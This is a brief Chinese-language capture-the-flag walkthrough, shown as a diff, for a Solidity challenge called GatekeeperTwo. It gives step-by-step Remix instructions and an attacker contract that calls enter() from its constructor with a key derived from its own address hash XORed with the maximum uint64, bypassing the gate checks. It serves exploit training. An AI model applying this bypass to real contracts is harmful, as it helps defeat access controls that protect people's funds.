@@ -1,0 +1,22 @@
+GatekeeperTwo
+1.打开Remix
+2.将GatekeeperTwo合约复制进文件
+3.将以代码放入同一文件中
+contract GatekeeperTwo1 {
+    GatekeeperTwo gatekeeperTow;
+    constructor(GatekeeperTwo _gatekeeperTow) public {
+        gatekeeperTow = _gatekeeperTow;
+        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1 );
+        gatekeeperTow.enter(key);
+
+    }
+
+    function getTest() public view  returns(uint64){
+        return  uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1 ;
+    }
+
+      function getTest1() public view  returns(bytes8){
+        return  bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1 );
+    }
+}
+4.部署GatekeeperTwo1合约
